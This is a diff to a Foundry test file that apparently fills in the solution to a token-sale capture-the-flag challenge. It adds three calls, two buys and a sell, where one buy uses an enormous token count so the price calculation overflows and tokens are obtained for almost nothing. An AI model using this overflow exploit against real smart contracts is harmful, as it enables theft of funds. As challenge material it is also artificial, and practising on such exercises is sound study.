@@ -19,6 +19,9 @@ contract TokenSaleTest is Test {
     function testIncrement() public {
         // Put your solution here
 
+        exploitContract.buy{value: 1 ether}(1);
+        exploitContract.buy{value: 415992086870360064}(115792089237316195423570985008687907853269984665640564039458);
+        exploitContract.sell(2);
         _checkSolved();
     }
 
